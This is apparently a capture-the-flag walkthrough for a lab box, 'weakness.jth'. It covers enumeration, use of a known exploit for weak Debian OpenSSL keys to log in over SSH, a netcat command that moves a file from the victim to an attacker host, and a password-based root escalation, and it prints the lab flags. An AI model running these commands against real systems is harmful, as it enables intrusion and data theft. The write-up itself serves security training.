We start enumerating the box with a quick nmap scan:
```
nmap -sV -sC -vv -T4 10.0.0.41  -p- 
```
We find a hostname ```weakness.jth``` and 3 open ports with the scan.
We add the host to the /etc/hosts file with the command ```echo "10.0.0.41 weakness.jth" >> /etc/hosts ```

Afterwards we continue enumeration with directory brute force and find an import file mykey.pub and another file that
points to a clue about the version of openssl that was used to create the key. We decide to use searchsploit to see if there
are any vulnerabilites that can be exploited. We find a text file with instructions on how to exploit a vulnerability in 
the version of openssl being used.
##### commands used during this phase:
```
gobuster dir -u "http://weakness.jth/" -w /usr/share/wordlists/dirb/common.txt

searchsploit openssl 0.9.8c-1

searchsploit -p linux/remote/5622.txt

cat /usr/share/exploitdb/exploits/linux/remote/5622.txt

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 

cat mykey.pub 

cd rsa/2048
grep -r -l "<copied code>"

ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@10.0.0.41
```
We have gained initial access and found the user.txt flag: ```25e3cd678875b601425c9356c8039f68```
We find a binary called code in the folder as well and send it over to our machine to decompile the binary on a web decompiler.
```
#victim machine:
nc -w 3 100.0.0.1 1234 < code
#attacker machine:
nc -nlvp 1234 > code
```
We find the password for n30 in the decompiled binary and use it to run ```sudo su``` gain root access and acquire the
root flag: ```a1d2fab76ec6af9b651d4053171e042e```

System has been rooted action is no longer required.
